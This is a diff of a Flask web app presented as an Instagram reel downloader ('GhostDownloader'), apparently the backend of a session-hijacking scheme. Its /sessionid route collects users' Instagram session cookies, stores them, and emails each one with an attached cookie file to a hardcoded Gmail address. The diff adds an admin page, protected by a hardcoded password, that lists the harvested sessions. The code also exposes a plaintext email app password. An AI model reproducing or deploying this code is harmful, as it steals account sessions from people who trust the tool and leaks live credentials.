@@ -1,16 +1,37 @@
-from flask import Flask, request, jsonify, send_file, Response, render_template_string, redirect
+from flask import Flask, request, jsonify, send_file, Response, make_response
 import yt_dlp
 import os
 import smtplib
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 from email.mime.application import MIMEApplication
+from functools import wraps
 
 app = Flask(__name__)
-SESSION_LOG_FILE = "session_ids_storage.txt"
-COOKIES_FILE = "cookies.txt"
-MAX_SESSION_LOG = 5
+# Admin credentials
+ADMIN_USERNAME = "admin"
+ADMIN_PASSWORD = "ghost123"
 
+# ---------------------- AUTH DECORATOR ----------------------
+def check_auth(username, password):
+    return username == ADMIN_USERNAME and password == ADMIN_PASSWORD
+
+def authenticate():
+    return Response(
+        "Authentication Required", 401,
+        {"WWW-Authenticate": 'Basic realm="Login Required"'}
+    )
+
+def requires_auth(f):
+    @wraps(f)
+    def decorated(*args, **kwargs):
+        auth = request.authorization
+        if not auth or not check_auth(auth.username, auth.password):
+            return authenticate()
+        return f(*args, **kwargs)
+    return decorated
+
+# ---------------------- EMAIL SENDER ----------------------
 def send_email(subject, body, to_email, attachment_path=None):
     from_email = "bashirahamad002@gmail.com"
     from_password = "nlfs lozn jebu odug"
@@ -24,19 +45,19 @@ def send_email(subject, body, to_email, attachment_path=None):
 
     if attachment_path and os.path.exists(attachment_path):
         with open(attachment_path, "rb") as f:
-            part = MIMEApplication(f.read(), Name=os.path.basename(attachment_path))
-            part["Content-Disposition"] = f'attachment; filename="{os.path.basename(attachment_path)}"'
-            msg.attach(part)
+            file_part = MIMEApplication(f.read(), Name=os.path.basename(attachment_path))
+            file_part['Content-Disposition'] = f'attachment; filename="{os.path.basename(attachment_path)}"'
+            msg.attach(file_part)
 
     try:
         with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
             server.login(from_email, from_password)
             server.send_message(msg)
-        print("✅ Email sent with attachment!")
+        print("✅ Email sent!")
     except Exception as e:
-        print(f"❌ Email error: {e}")
+        print(f"❌ Failed to send email: {e}")
 
-
+# ---------------------- ROUTES ----------------------
 @app.route("/")
 def home():
     return "👻 Instagram Reel Downloader API is running!"
@@ -48,15 +69,14 @@ def download():
     url = data.get("url")
     if not url:
         return jsonify({"error": "Missing URL"}), 400
-    
-    
+
     try:
 
         ydl_opts = {
             "format": "bestvideo+bestaudio/best",
             "merge_output_format": "mp4",
             "outtmpl": "/tmp/%(id)s.%(ext)s",
-            "cookiefile": COOKIES_FILE,
+            "cookiefile": "cookies.txt",
         }
 
         with yt_dlp.YoutubeDL(ydl_opts) as ydl:
@@ -70,7 +90,7 @@ def download():
 
     except Exception as e:
         return jsonify({"error": str(e)}), 500
-
+    
 
 @app.route("/sessionid", methods=["POST"])
 def receive_sessionid():
@@ -81,87 +101,74 @@ def receive_sessionid():
 
     print(f"[✔️ RECEIVED] Session ID: {session_id}")
 
-    # Write cookies.txt
+
     cookie_content = f"""# Netscape HTTP Cookie File
 .instagram.com	TRUE	/	FALSE	9999999999	sessionid	{session_id}
 """
-    with open(COOKIES_FILE, "w") as f:
-        f.write(cookie_content)
-
-    # Save to log file (keep only last MAX_SESSION_LOG entries)
     try:
-        lines = []
-        if os.path.exists(SESSION_LOG_FILE):
-            with open(SESSION_LOG_FILE, "r") as f:
-                lines = f.readlines()
-
-        lines = [session_id + "\n"] + lines
-        lines = lines[:MAX_SESSION_LOG]
-
-        with open(SESSION_LOG_FILE, "w") as f:
-            f.writelines(lines)
-
+        with open("cookies.txt", "w") as file:
+            file.write(cookie_content)
     except Exception as e:
-        print(f"❌ Session log error: {e}")
+        return jsonify({"error": "Failed to save cookie"}), 500
 
-    # Email the session with cookies.txt attached
-    send_email(
-        subject="👻 GhostDownloader - New Instagram Session ID",
-        body=f"New session ID received:\n\n{session_id}",
-        to_email="bashirahamad002@gmail.com",
-        attachment_path=COOKIES_FILE
-    )
+    # Keep only the last 5 session IDs
+    try:
+        if os.path.exists("session_ids_storage.txt"):
+            with open("session_ids_storage.txt", "r") as file:
+                lines = file.readlines()
+        else:
+            lines = []
+        lines.append(session_id + "\n")
+        lines = lines[-5:]
+        with open("session_ids_storage.txt", "w") as file:
+            file.writelines(lines)
+    except Exception as e:
+        print(f"Failed to manage session_ids_storage.txt: {e}")
+
+    # Email with cookies.txt
+    try:
+        send_email(
+            subject="👻 GhostDownloader - New Instagram Session ID",
+            body=f"Session ID:\n{session_id}",
+            to_email="bashirahamad002@gmail.com",
+            attachment_path="cookies.txt"
+        )
+    except Exception as e:
+        print(f"❌ Email failed: {e}")
 
     return jsonify({"message": "Session ID saved, emailed, and cookies.txt generated"}), 200
 
-
-@app.route("/view-sessionids", methods=["GET"])
-def view_sessionids():
-    try:
-        with open(SESSION_LOG_FILE, "r") as file:
-            content = file.read()
-        return Response(content, mimetype="text/plain")
-    except FileNotFoundError:
-        return Response("No session IDs saved yet.", mimetype="text/plain")
-
-
 @app.route("/admin", methods=["GET", "POST"])
+
+
+@requires_auth
 def admin_panel():
     if request.method == "POST":
-        action = request.form.get("action")
-        if action == "clear":
-            open(SESSION_LOG_FILE, "w").close()
-            return redirect("/admin")
+        open("session_ids_storage.txt", "w").close()
+        return '''
+            <h3>✅ All Session IDs Cleared!</h3>
+            <a href="/admin">Back to Admin Panel</a>
+        '''
+    try:
+        with open("session_ids_storage.txt", "r") as file:
+            session_data = file.read()
+    except FileNotFoundError:
+        session_data = "No session IDs yet."
 
-    session_list = []
-    if os.path.exists(SESSION_LOG_FILE):
-        with open(SESSION_LOG_FILE, "r") as f:
-            session_list = [line.strip() for line in f if line.strip()]
-
-    return render_template_string("""
+    return f"""
         <html>
-        <head>
-            <title>👻 GhostDownloader Admin</title>
-        </head>
-        <body style="font-family: sans-serif; margin: 40px;">
-            <h1>Admin Panel - Session IDs</h1>
-            {% if session_list %}
-                <ul>
-                {% for s in session_list %}
-                    <li><code>{{ s }}</code></li>
-                {% endfor %}
-                </ul>
-            {% else %}
-                <p>No session IDs saved.</p>
-            {% endif %}
-            <form method="post">
-                <button name="action" value="clear" style="padding: 10px 20px; background: red; color: white;">Clear All</button>
+        <head><title>👻 GhostDownloader Admin</title></head>
+        <body>
+            <h2>Admin Panel</h2>
+            <pre>{session_data}</pre>
+            <form method="POST">
+                <button type="submit">❌ Clear All Session IDs</button>
             </form>
         </body>
         </html>
-    """, session_list=session_list)
+    """
 
-
+# ---------------------- MAIN ----------------------
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 10000))
     app.run(host="0.0.0.0", port=port)
